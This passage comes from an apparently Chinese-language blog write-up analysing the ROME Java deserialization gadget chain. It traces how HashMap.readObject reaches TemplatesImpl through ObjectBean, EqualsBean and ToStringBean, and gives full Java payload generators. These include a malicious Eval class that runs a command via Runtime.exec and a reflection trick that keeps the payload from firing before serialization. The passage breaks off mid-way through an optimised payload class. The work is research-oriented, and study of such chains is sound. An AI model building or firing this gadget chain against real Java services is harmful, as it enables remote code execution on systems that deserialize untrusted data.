在这里调用</span><br><span class="line">        descriptors = getPDs(klass);</span><br><span class="line">        _introspected.put(klass,descriptors);</span><br><span class="line">    &#125;</span><br><span class="line">    return descriptors;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同理，这里应当将 Templates.class 作为参数 klass 的值。</p><h4 id="ToStringBean-toString-String"><a href="#ToStringBean-toString-String" class="headerlink" title="ToStringBean#toString(String)"></a>ToStringBean#toString(String)</h4><p>ToStringBean 的有参 toString 方法调用了 BeanIntrospector 的 getPropertyDescriptors 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">private String toString(String prefix) &#123;</span><br><span class="line">    StringBuffer sb = new StringBuffer(128);</span><br><span class="line">    try &#123;</span><br><span class="line">    // 在这里调用</span><br><span class="line">        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(_beanClass);</span><br><span class="line">        if (pds!=null) &#123;</span><br><span class="line">            for (int i=0;i&lt;pds.length;i++) &#123;</span><br><span class="line">                String pName = pds[i].getName();</span><br><span class="line">                Method pReadMethod = pds[i].getReadMethod();</span><br><span class="line">                if (pReadMethod!=null &amp;&amp;                             // ensure it has a getter method</span><br><span class="line">                    pReadMethod.getDeclaringClass()!=Object.class &amp;&amp; // filter Object.class getter methods</span><br><span class="line">                    pReadMethod.getParameterTypes().length==0) &#123;     // filter getter methods that take parameters</span><br><span class="line">                    // 在这里执行 getPropertyDescriptors 方法</span><br><span class="line">                    Object value = pReadMethod.invoke(_obj,NO_PARAMS);</span><br><span class="line">                    printProperty(sb,prefix+&quot;.&quot;+pName,value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    catch (Exception ex) &#123;</span><br><span class="line">        sb.append(&quot;\n\nEXCEPTION: Could not complete &quot;+_obj.getClass()+&quot;.toString(): &quot;+ex.getMessage()+&quot;\n&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">    return sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么这里应当将 _beanClass 设置成 Templates.class 。_beanClass 是 ToStringBean 中定义的属性，在构造方法中被赋值。</p><p>Templates 中的两个方法只有 getOutputProperties() 是 getter 方法，所以经过判断后只有 getOutputProperties() 会被执行：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object value = pReadMethod.invoke(_obj,NO_PARAMS);</span><br></pre></td></tr></table></figure><p>invoke 方法的第一个参数是执行此方法的对象，所以要将 _obj 设置成 TemplatesImpl 对象，同样可以在构造方法中赋值。</p><h4 id="ToStringBean-toString"><a href="#ToStringBean-toString" class="headerlink" title="ToStringBean#toString()"></a>ToStringBean#toString()</h4><p>ToStringBean 的无参 toString 方法调用了有参 toString 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public String toString() &#123;</span><br><span class="line">    Stack stack = (Stack) PREFIX_TL.get();</span><br><span class="line">    String[] tsInfo = (String[]) ((stack.isEmpty()) ? null : stack.peek());</span><br><span class="line">    String prefix;</span><br><span class="line">    if (tsInfo==null) &#123;</span><br><span class="line">        String className = _obj.getClass().getName();</span><br><span class="line">        prefix = className.substring(className.lastIndexOf(&quot;.&quot;)+1);</span><br><span class="line">    &#125;</span><br><span class="line">    else &#123;</span><br><span class="line">        prefix = tsInfo[0];</span><br><span class="line">        tsInfo[1] = prefix;</span><br><span class="line">    &#125;</span><br><span class="line">    // 在这里调用</span><br><span class="line">    return toString(prefix);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>到这里可以先写个小程序验证一下。</p><h4 id="写个小程序验证一下"><a href="#写个小程序验证一下" class="headerlink" title="写个小程序验证一下"></a>写个小程序验证一下</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line"></span><br><span class="line">public class ROME_toString &#123;</span><br><span class="line"></span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 将恶意类的字节码文件存入字节数组</span><br><span class="line">        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\Rome利用链分析\\RomeTest\\target\\classes\\Eval.class&quot;));</span><br><span class="line"></span><br><span class="line">        // 新建利用链 TemplatesImpl 对象</span><br><span class="line">        TemplatesImpl templatesImpl = new TemplatesImpl();</span><br><span class="line">        setValue(templatesImpl,&quot;_name&quot;,&quot;aaa&quot;);</span><br><span class="line">        setValue(templatesImpl,&quot;_bytecodes&quot;,new byte[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        // 在构造方法中将 _beanClass 赋值成 Templates.class, _obj 赋值成 TemplatesImpl 对象</span><br><span class="line">        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesImpl);</span><br><span class="line">        // 利用 toString 命令执行</span><br><span class="line">        toStringBean.toString();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反射设置属性值的过程可以抽离成一个方法</span><br><span class="line">    public static void setValue(Object obj, String name, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>其中 Eval 类内容如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.DOM;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.TransletException;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line">import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;</span><br><span class="line">import com.sun.org.apache.xml.internal.serializer.SerializationHandler;</span><br><span class="line">import java.io.IOException;</span><br><span class="line"></span><br><span class="line">public class Eval extends AbstractTranslet &#123;</span><br><span class="line">    public Eval() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    static &#123;</span><br><span class="line">        try &#123;</span><br><span class="line">            Runtime.getRuntime().exec(&quot;calc&quot;);</span><br><span class="line">        &#125; catch (IOException var1) &#123;</span><br><span class="line">            throw new RuntimeException(var1);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后成功弹出计算器，验证完成。</p><h4 id="EqualsBean-beanHashCode"><a href="#EqualsBean-beanHashCode" class="headerlink" title="EqualsBean#beanHashCode()"></a>EqualsBean#beanHashCode()</h4><p>EqualsBean 的 beanHashCode() 方法会调用其成员属性 _obj 的 toString() 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public int beanHashCode() &#123;</span><br><span class="line">    return _obj.toString().hashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>只需要将 _obj 设置成 ToStringBean 对象即可。</p><h4 id="ObjectBean-hashCode"><a href="#ObjectBean-hashCode" class="headerlink" title="ObjectBean#hashCode()"></a>ObjectBean#hashCode()</h4><p>ObjectBean 的 hashCode() 方法会调用其成员属性 _equalsBean 的 beanHashCode() 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public int hashCode() &#123;</span><br><span class="line">    return _equalsBean.beanHashCode();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>_equalsBean 在其构造方法中是这样被赋值的：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">public ObjectBean(Class beanClass,Object obj,Set ignoreProperties) &#123;</span><br><span class="line">    _equalsBean = new EqualsBean(beanClass,obj);</span><br><span class="line">    _toStringBean = new ToStringBean(beanClass,obj);</span><br><span class="line">    _cloneableBean = new CloneableBean(obj,ignoreProperties);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以看到这里是 new 了一个 EqualsBean 对象。</p><h4 id="HashMap-hash-Object"><a href="#HashMap-hash-Object" class="headerlink" title="HashMap#hash(Object)"></a>HashMap#hash(Object)</h4><p>HashMap 的 hash 方法会调用 key 的 hashCode() 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">static final int hash(Object key) &#123;</span><br><span class="line">    int h;</span><br><span class="line">    return (key == null) ? 0 : (h = key.hashCode()) ^ (h &gt;&gt;&gt; 16);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="HashMap-readObject-java-io-ObjectInputStream"><a href="#HashMap-readObject-java-io-ObjectInputStream" class="headerlink" title="HashMap#readObject(java.io.ObjectInputStream)"></a>HashMap#readObject(java.io.ObjectInputStream)</h4><p>入口，经典永流传。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">private void readObject(java.io.ObjectInputStream s)</span><br><span class="line">    throws IOException, ClassNotFoundException &#123;</span><br><span class="line">    // Read in the threshold (ignored), loadfactor, and any hidden stuff</span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    if (loadFactor &lt;= 0 || Float.isNaN(loadFactor))</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal load factor: &quot; +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                // Read and ignore number of buckets</span><br><span class="line">    int mappings = s.readInt(); // Read number of mappings (size)</span><br><span class="line">    if (mappings &lt; 0)</span><br><span class="line">        throw new InvalidObjectException(&quot;Illegal mappings count: &quot; +</span><br><span class="line">                                         mappings);</span><br><span class="line">    else if (mappings &gt; 0) &#123; // (if zero, use defaults)</span><br><span class="line">        // Size the table using given load factor only if within</span><br><span class="line">        // range of 0.25...4.0</span><br><span class="line">        float lf = Math.min(Math.max(0.25f, loadFactor), 4.0f);</span><br><span class="line">        float fc = (float)mappings / lf + 1.0f;</span><br><span class="line">        int cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((int)fc));</span><br><span class="line">        float ft = (float)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (int)ft : Integer.MAX_VALUE);</span><br><span class="line">        @SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span><br><span class="line">            Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])new Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        // Read the keys and values, and put the mappings in the HashMap</span><br><span class="line">        for (int i = 0; i &lt; mappings; i++) &#123;</span><br><span class="line">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            @SuppressWarnings(&quot;unchecked&quot;)</span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            // 在这里调用 hash 方法</span><br><span class="line">            putVal(hash(key), key, value, false, false);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>至此，这条链子就剖析完成了。</p><h4 id="调用栈总结"><a href="#调用栈总结" class="headerlink" title="调用栈总结"></a>调用栈总结</h4><ol><li>HashMap#readObject(java.io.ObjectInputStream)</li><li>HashMap#hash(Object)</li><li>ObjectBean#hashCode()</li><li>EqualsBean#beanHashCode()</li><li>ToStringBean#toString()</li><li>ToStringBean#toString(String)</li><li>BeanIntrospector#getPropertyDescriptors(Class)</li><li>BeanIntrospector#getPDs(Class)</li><li>TemplatesImpl#getOutputProperties()</li><li>TemplatesImpl#newTransformer()</li><li>TemplatesImpl#getTransletInstance()</li><li>TemplatesImpl#defineTransletClasses()</li><li>TransletClassLoader#defineClass()</li></ol><h4 id="构造-payload"><a href="#构造-payload" class="headerlink" title="构造 payload"></a>构造 payload</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line">import com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line">import com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class payload &#123;</span><br><span class="line">    public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        // 将恶意类的字节码文件存入字节数组</span><br><span class="line">        byte[] bytecodes = Files.readAllBytes(Paths.get(&quot;C:\\Users\\miaoj\\Documents\\Java安全代码实验\\Rome利用链分析\\RomeTest\\target\\classes\\Eval.class&quot;));</span><br><span class="line"></span><br><span class="line">        // 新建利用链 TemplatesImpl 对象</span><br><span class="line">        TemplatesImpl templatesImpl = new TemplatesImpl();</span><br><span class="line">        setValue(templatesImpl,&quot;_name&quot;,&quot;aaa&quot;);</span><br><span class="line">        setValue(templatesImpl,&quot;_bytecodes&quot;,new byte[][] &#123;bytecodes&#125;);</span><br><span class="line">        setValue(templatesImpl, &quot;_tfactory&quot;, new TransformerFactoryImpl());</span><br><span class="line"></span><br><span class="line">        // 利用 ToStringBean 的 toString() 方法调用 TemplatesImpl 的 getOutputProperties() 方法</span><br><span class="line">        ToStringBean toStringBean = new ToStringBean(Templates.class,templatesImpl);</span><br><span class="line"></span><br><span class="line">        // 利用 EqualsBean 的 beanHashCode() 方法调用 ToStringBean 的 toString() 方法</span><br><span class="line">        EqualsBean equalsBean = new EqualsBean(ToStringBean.class, toStringBean);</span><br><span class="line"></span><br><span class="line">        // 利用 ObjectBean 的 hashCode() 方法调用 EqualsBean 的 beanHashCode() 方法</span><br><span class="line">        // 为防止调用 put 方法时命令执行，先传入一个普通的 ObjectBean</span><br><span class="line">        HashMap hashMap0 = new HashMap();</span><br><span class="line">        ObjectBean objectBean = new ObjectBean(HashMap.class, hashMap0);</span><br><span class="line"></span><br><span class="line">        // HashMap 的 hash() 方法会调用 key 的 hashCode() 方法，readObject() 方法会调用 hash() 方法</span><br><span class="line">        HashMap hashMap = new HashMap();</span><br><span class="line">        hashMap.put(objectBean, &quot;test&quot;);</span><br><span class="line"></span><br><span class="line">        // 反射修改 ObjectBean 的属性值</span><br><span class="line">        setValue(objectBean, &quot;_equalsBean&quot;, equalsBean);</span><br><span class="line"></span><br><span class="line">        // 序列化成字节数组</span><br><span class="line">        ByteArrayOutputStream baos = new ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = new ObjectOutputStream(baos);</span><br><span class="line">        oos.writeObject(hashMap);</span><br><span class="line">        oos.flush();</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        // 反序列化字节数组</span><br><span class="line">        ByteArrayInputStream bais = new ByteArrayInputStream(baos.toByteArray());</span><br><span class="line">        ObjectInputStream ois = new ObjectInputStream(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // 反射设置属性值的过程可以抽离成一个方法</span><br><span class="line">    public static void setValue(Object obj, String name, Object value) throws Exception&#123;</span><br><span class="line">        Field field = obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(true);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="反射修改-HashMap-的-key-值以优化-payload"><a href="#反射修改-HashMap-的-key-值以优化-payload" class="headerlink" title="反射修改 HashMap 的 key 值以优化 payload"></a>反射修改 HashMap 的 key 值以优化 payload</h4><p>在调用 HashMap 的 put 方法时，总是会因为 put 方法要调用 putVal 方法或者 hash 而导致提前命令执行，是否可以通过反射修改 HashMap 的 key 值呢？枫の师傅的文章中给出了解决方案。</p><p>HashMap 的 put 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">public V put(K key, V value) &#123;</span><br><span class="line">    return putVal(hash(key), key, value, false, true);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>HashMap 的 putVal 方法：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">final V putVal(int hash, K key, V value, boolean onlyIfAbsent,</span><br><span class="line">               boolean evict) &#123;</span><br><span class="line">    Node&lt;K,V&gt;[] tab; Node&lt;K,V&gt; p; int n, i;</span><br><span class="line">    if ((tab = table) == null || (n = tab.length) == 0)</span><br><span class="line">        n = (tab = resize()).length;</span><br><span class="line">    if ((p = tab[i = (n - 1) &amp; hash]) == null)</span><br><span class="line">        tab[i] = newNode(hash, key, value, null);</span><br><span class="line">    else &#123;</span><br><span class="line">        Node&lt;K,V&gt; e; K k;</span><br><span class="line">        if (p.hash == hash &amp;&amp;</span><br><span class="line">            ((k = p.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br><span class="line">            e = p;</span><br><span class="line">        else if (p instanceof TreeNode)</span><br><span class="line">            e = ((TreeNode&lt;K,V&gt;)p).putTreeVal(this, tab, hash, key, value);</span><br><span class="line">        else &#123;</span><br><span class="line">            for (int binCount = 0; ; ++binCount) &#123;</span><br><span class="line">                if ((e = p.next) == null) &#123;</span><br><span class="line">                    p.next = newNode(hash, key, value, null);</span><br><span class="line">                    if (binCount &gt;= TREEIFY_THRESHOLD - 1) // -1 for 1st</span><br><span class="line">                        treeifyBin(tab, hash);</span><br><span class="line">                    break;</span><br><span class="line">                &#125;</span><br><span class="line">                if (e.hash == hash &amp;&amp;</span><br><span class="line">                    ((k = e.key) == key || (key != null &amp;&amp; key.equals(k))))</span><br><span class="line">                    break;</span><br><span class="line">                p = e;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        if (e != null) &#123; // existing mapping for key</span><br><span class="line">            V oldValue = e.value;</span><br><span class="line">            if (!onlyIfAbsent || oldValue == null)</span><br><span class="line">                e.value = value;</span><br><span class="line">            afterNodeAccess(e);</span><br><span class="line">            return oldValue;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++modCount;</span><br><span class="line">    if (++size &gt; threshold)</span><br><span class="line">        resize();</span><br><span class="line">    afterNodeInsertion(evict);</span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里用了一些算法，看不懂没关系，总之是进行了一个键值对的存储，这个键值对最终被插入到 table 数组的一个位置中，具体位置取决于计算得到的索引 i 。</p><p>table 是 HashMap 的一个属性，来看它的定义：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">transient Node&lt;K,V&gt;[] table;</span><br></pre></td></tr></table></figure><p>这个 Node&lt;K,V&gt; 是 HashMap 中定义的一个静态内部类：</p><img src="/images/image-20240606153409911.png"><p>也就是说，我们调用 put 方法存进来的键值对最终是以 Node&lt;K,V&gt; 对象的形式存放在数组里面的。</p><p>那么，我们可以用以下方式来修改 key ：</p><pre><code>// 新建 HashMap 对象，设置初始容量HashMap&lt;Object,Object&gt; hashMap = new HashMap&lt;&gt;(1);// 先存入无关数据hashMap.put(&quot;test1&quot;, &quot;test2&quot;);// 反射获取 table 属性Object[] table= (Object[]) getValue(hashMap,&quot;table&quot;);// 获取 table 数组中的 Node 对象Object entry = table[1];// 反射修改 Node 对象的 key 属性值setValue(entry,&quot;key&quot;,equalsBean);</code></pre><p>其中 getValue 方法内容如下：</p><pre><code>public static Object getValue(Object obj, String name) throws Exception&#123;    Field field = obj.getClass().getDeclaredField(name);    field.setAccessible(true);    return field.get(obj);&#125;</code></pre><p>在此基础上，我们可以优化上面的 payload ：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br></pre></td><td class="code"><pre><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line">import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class="line">import com.sun.syndication.feed.impl.EqualsBean;</span><br><span class="line">import com.sun.syndication.feed.impl.ObjectBean;</span><br><span class="line">import com.sun.syndication.feed.impl.ToStringBean;</span><br><span class="line"></span><br><span class="line">import javax.xml.transform.Templates;</span><br><span class="line">import java.io.ByteArrayInputStream;</span><br><span class="line">import java.io.ByteArrayOutputStream;</span><br><span class="line">import java.io.ObjectInputStream;</span><br><span class="line">import java.io.ObjectOutputStream;</span><br><span class="line">import java.lang.reflect.Field;</span><br><span class="line">import java.nio.file.Files;</span><br><span class="line">import java.nio.file.Paths;</span><br><span class="line">import java.util.HashMap;</span><br><span class="line"></span><br><span class="line">public class payload &#123;</span><br><span class="line">    public static void 